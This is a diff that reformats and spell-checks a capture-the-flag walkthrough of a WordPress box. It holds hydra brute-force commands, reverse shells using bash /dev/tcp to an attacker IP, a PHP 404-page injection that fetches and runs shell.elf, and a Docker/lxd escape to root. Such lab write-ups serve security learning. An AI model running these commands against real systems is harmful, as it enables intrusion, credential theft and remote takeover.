@@ -1,3 +1,4 @@
+```bash
 ┌──(kali㉿kali)-[~]
 └─$ nmap 10.10.28.76                                                                                                                                               130 ⨯
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-08 11:53 EDT
@@ -9,7 +10,7 @@ PORT   STATE  SERVICE
 80/tcp open   http		website
 
 Nmap done: 1 IP address (1 host up) scanned in 9.47 seconds
- 
+```
  
  
  
@@ -21,7 +22,7 @@ Allow: /wp-admin/admin-ajax.php
 
 
 
-
+```bash
 ┌──(kali㉿kali)-[~]
 └─$ dirsearch -r -u 10.10.231.186           
 
@@ -89,18 +90,18 @@ Target: http://10.10.231.186/
 [09:00:29] 301 -    0B  - /index.php  ->  http://10.10.231.186/
 [09:00:36] 301 -    0B  - /index.php/login/  ->  http://10.10.231.186/login/
 59.07% | 3 req/s - Errors: 541 - Last request to: installed.json
-
+```
 
 seems to be stuck there,,,
 
 
-doind directory enumeration found this under /images
+doing directory enumeration found this under /images
 
 wordpress:php7.2-apache
 mysql:5.7
 
 
-                                                                                                                                                                        
+ ```bash                                                                                                                                                                     
 ┌──(kali㉿kali)-[~]
 └─$ searchsploit wordpress 7.2-apache
 --------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
@@ -118,7 +119,7 @@ Shellcodes: No Results
 
 {"code":"rest_no_route","message":"No route was found matching the URL and request method","data":{"status":404}}      
 
-
+```
                                    
                             
 tried the google with different directories no luck,,, but wait, there is a google link that looked weird,,,,hmmm
@@ -126,7 +127,7 @@ tried the google with different directories no luck,,, but wait, there is a goog
 
 decided to do a proper nmap
 
-                                                                                  
+ ```bash                                                                              
 ┌──(kali㉿kali)-[~]
 └─$ nmap -sV -A -sC 10.10.231.186 -p80                                       130 ⨯
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-10 10:10 EDT
@@ -184,7 +185,7 @@ PORT   STATE SERVICE
 |_Search stopped at ID #25. Increase the upper limit if necessary with 'http-wordpress-users.limit'
 
 Nmap done: 1 IP address (1 host up) scanned in 66.86 seconds
-
+```
 we have a wp login site
 
 http://10.10.231.186/wp-login.php
@@ -192,28 +193,28 @@ http://10.10.231.186/wp-login.php
 tried hydra not getting along with hydra today, going to zap it
 
 
-                                                                                  
+ ```bash                                                                                 
 ┌──(kali㉿kali)-[~]
 └─$ hydra -l sysadmin -P /usr/share/wordlists/rockyou500.txt http-post-form "/wp-login.php:user_login=sysadmin&user_pass=^PASS^:The password you entered for the username sysadmin is incorrect." http://10.10.231.186/
-
+```
 
 so the first thing I noticed is , the id is wrong
 
 log=sysadmin&pwd=test&wp-submit=Log+In&redirect_to=http%3A%2Fwp-admin%2F&testcookie=1
-
+```bash
 hydra -l sysadmin -P /usr/share/wordlists/rockyou500.txt http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2Fwp-admin%2F&testcookie=1:The password you entered for the username sysadmin is incorrect." http://10.10.231.186/
 
 hydra -l sysadmin -P /usr/share/wordlists/rockyou500.txt http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2Fwp-admin%2F&testcookie=0:The password you entered for the username sysadmin is incorrect." http://10.10.231.186/
 
 hydra -l sysadmin -P /usr/share/wordlists/rockyou500.txt http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=true:'Error: The password you entered for the username sysadmin is incorrect.'" http://10.10.141.220/
 
-
+```
 
 
 
 
 ZAP Kicked ass!!!
-
+```bash
 1661	Fuzzed	302	Found	166	1148	0		{}	milkshake
 0	Original	200	OK	224	441	4975		{}	
 5	Fuzzed	200	OK	257	441	4975		{}	iloveyou
@@ -221,16 +222,11 @@ ZAP Kicked ass!!!
 2	Fuzzed	200	OK	284	441	4975		{}	12345
 1	Fuzzed	200	OK	298	441	4975		{}	123456
 4	Fuzzed	200	OK	283	441	4975		{fuzz.httpfuzzerReflectionDetectorStateHighlighter.ReflectionData=[password]}	password
-
-
-
+```
 
 sysadmin:milkshake
 
-
-
-
-                                                                                  
+```bash                                                                                 
 ┌──(kali㉿kali)-[~]
 └─$ wpscan --url 10.10.141.20 --login-uri /wp-login.php --http-auth sysadmin:milkshake 
 _______________________________________________________________
@@ -250,14 +246,10 @@ _______________________________________________________________
 
 Scan Aborted: The url supplied 'http://10.10.141.20/' seems to be down (Timeout was reached)
 
+```
 
 
-
-
-
-
-
-loged in and will try reverse shell on 404 page, 
+logged in and will try reverse shell on 404 page, 
 
 and we get an error
 
@@ -270,8 +262,8 @@ aka ssh
 
 tried on 404, not working, maybe different theme?
 
-going to plugin, disactivate plug in before editing it. 
-paste bash shell at end of file, don't delete php code (with no endind element???????????????????????????????????????)
+going to plugin, deactivate plug in before editing it. 
+paste bash shell at end of file, don't delete php code (with no ending element???????????????????????????????????????)
 
 
 
@@ -281,7 +273,7 @@ exec("/bin/bash -c 'bash -i >& /dev/tcp/10.6.65.43/1234 0>&1'");
 exec("/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1'")
 
 
-
+```bash
 ┌──(kali㉿kali)-[~]
 └─$ nc -lnvp 1234                                                                                                                                                    1 ⨯
 listening on [any] 1234 ...
@@ -335,7 +327,7 @@ www-data@ce0442249805:/$ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec 
 -rwsr-xr-x 1 root root 51280 Jan 10  2019 /bin/mount
 -rwsr-xr-x 1 root root 63568 Jan 10  2019 /bin/su
 -rwsr-xr-x 1 root root 34888 Jan 10  2019 /bin/umount
-
+```
 
 ran wpscan again, nothing, 
 
@@ -346,7 +338,7 @@ https://www.hackingarticles.in/wordpress-reverse-shell/
 
 going into msf world
 
-
+```bash
 WordPress version: 5.4.2
 
 msf6 > searchsploit WordPress 5.4.2
@@ -358,18 +350,18 @@ msf6 > searchsploit WordPress 5.4.2
 WordPress Plugin DZS Videogallery < 8.60 - Multiple Vulnerabilities                                                                    | php/webapps/39553.txt
 WordPress Plugin iThemes Security < 7.0.3 - SQL Injection                                                                              | php/webapps/44943.txt
 WordPress Plugin Rest Google Maps < 7.11.18 - SQL Injection                                                                            | php/webapps/48918.sh
-
+```
 for first shell in plugin
 exec("/bin/bash -c 'bash -i >& /dev/tcp/10.6.65.43/1234 0>&1'");
 
 pivot to msf
 sh -i >& /dev/tcp/10.6.65.43/9900 0>&1
 
-
+```bash
 running shell in msf found :
 Found script at $ /usr/bin/script
 [*] Using `script` to pop up an interactive shell
-
+```
 
 
 
@@ -387,21 +379,21 @@ python3 -m http.server 80
 
 
 we inject php into 404
-
+```php
 <?php
 echo "[*] Check your meterpreter listener :\n";
 system("curl 10.6.65.43/shell.elf --output /tmp/shell.elf");
 system("chmod +x /tmp/shell.elf");
 system("/tmp/shell.elf");
 ?>
-
+```
 in meterpreter shell ,
 portfwd add -l 22 -p 22 -r 172.18.0.1
 
 we need to make key
 ssh-keygen -f "/hackme/scripts/.ssh/known_hosts" -R "127.0.0.1"
 
-
+```bash
 sysadmin@ubuntu:/tmp$ curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
 [{"Containers":-1,"Created":1605921791,"Id":"sha256:ae0658fdbad5fb1c9413c998d8a573eeb5d16713463992005029c591e6400d02","Labels":null,"ParentId":"","RepoDigests":["mysql@sha256:8e2004f9fe43df06c3030090f593021a5f283d028b5ed5765cc24236c2c4d88e"],"RepoTags":["mysql:5.7"],"SharedSize":-1,"Size":448501465,"VirtualSize":448501465},
 
@@ -420,10 +412,10 @@ curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.so
 sysadmin@ubuntu:/tmp$ 
 curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/237cb3a25fbbcf9b4bd397e6f4ef999552b2870620c09fa0da7ee2a060be2d6e/start
 
+```
 
-
-wtf
-
+wth
+```bash
 ┌──(root💀kali)-[/hackme/scripts/alpine/lxd-alpine-builder]
 └─# cd lxd-alpine-builder; ./build-alpine
 
@@ -482,7 +474,7 @@ root.txt
 /mnt/root/root # cat root.txt
 Kainiy1Onoonoh3j
 
-                                                                
+```                                                              
 
 
 
